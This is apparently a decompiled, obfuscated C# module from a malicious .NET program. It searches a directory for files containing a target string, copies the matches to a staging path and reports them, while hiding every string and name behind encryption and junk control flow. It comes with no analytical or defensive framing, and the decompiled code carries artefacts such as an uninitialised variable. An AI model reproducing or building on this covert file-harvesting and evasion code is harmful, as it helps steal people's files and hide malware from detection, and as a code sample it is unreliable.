using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;

public class ____________________________________
{
	public string _;

	public void _()
	{
		try
		{
			bool flag = false;
			System.IO.DirectoryInfo directoryInfo = new System.IO.DirectoryInfo(______________________.___);
			System.IO.FileInfo[] files = directoryInfo.GetFiles(<Module>.___<string>(4008727444u));
			for (int i = 0; i < files.Length; i++)
			{
				System.IO.FileInfo fileInfo = files[i];
				try
				{
					int num;
					do
					{
						string text = System.IO.File.ReadAllText(fileInfo.FullName).ToLower();
						if (!text.Contains(this._))
						{
							goto IL_C0;
						}
					}
					while ((766464 * num & 32) != 0);
					System.IO.File.WriteAllText(______________________._____ + this._ + <Module>.____<string>(511728657u), System.IO.File.ReadAllText(fileInfo.FullName));
					______________________________________________________________.______________(<Module>.___<string>(982404538u), <Module>.______<string>(372145989u) + this._ + <Module>._______<string>(1916090129u));
					flag = true;
					IL_C0:;
				}
				catch (System.Exception arg_C2_0)
				{
					ProjectData.SetProjectError(arg_C2_0);
					ProjectData.ClearProjectError();
				}
			}
			if (flag)
			{
				____________________._();
			}
		}
		catch (System.Exception expr_E1)
		{
			ProjectData.SetProjectError(expr_E1);
			System.Exception ex = expr_E1;
			______________________________________________________________.______________(<Module>._______<string>(2357608790u), <Module>._____<string>(991691740u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}
}
